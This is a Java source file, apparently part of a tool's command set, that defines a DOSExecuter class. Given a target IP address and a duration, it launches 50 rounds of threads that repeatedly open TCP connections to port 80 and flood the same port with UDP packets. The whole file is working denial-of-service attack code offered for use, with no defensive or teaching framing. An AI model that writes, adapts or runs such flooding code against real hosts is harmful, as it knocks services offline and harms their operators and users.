package dev.monsoon.command.impl.dos;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.Socket;
import java.util.Timer;
import java.util.TimerTask;

public class DOSExecuter implements Runnable
{
    private String ip_address;
    private Timer timer;
    private int seconds,secondsToRun;

    public DOSExecuter(String ip_address,int secondsToRun)
    {
        this.ip_address=ip_address;
        this.secondsToRun=secondsToRun;
        seconds=0;
        timer=new Timer();
        timer.schedule(new TimerTask() {

            @Override
            public void run() {
                seconds++;
            }
        },0,1000);
        Thread thread=new Thread(this);
        thread.start();
    }

    @Override
    public void run()
    {
        for(int i = 0; i < 50; i++) {
            System.out.println("Thread " + i);
            new Thread(new Runnable() {

                @Override
                public void run() {
                    while (seconds < secondsToRun)
                        try {
                            Socket socket = new Socket(ip_address, 80);
                        } catch (IOException exc) {
                            if (seconds < secondsToRun) {
                                System.out.println("Exiting...");
                                return;
                            }
                        }
                    System.out.println("Exiting...");
                }
            }).start();
            ;


            new Thread(new Runnable() {

                @Override
                public void run() {
                    long a = System.currentTimeMillis() + seconds;
                    InetAddress address;
                    byte[] buff = new byte[10];
                    DatagramPacket packet;
                    DatagramSocket socket;
                    try {
                        address = InetAddress.getByName(ip_address);
                        packet = new DatagramPacket(buff, buff.length, address, 80);
                        socket = new DatagramSocket();
                    } catch (Exception e) {
                        return;
                    }
                    while (System.currentTimeMillis() < a) {
                        try {
                            socket.send(packet);
                            socket.send(packet);
                            socket.send(packet);
                        } catch (Exception e) {

                        }
                    }
                }
            }).start();
        }
    }

    @Deprecated
    private void sendData(String text,Socket socket) throws IOException
    {
        BufferedWriter writer=new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
        writer.write(text);
        writer.flush();
    }
}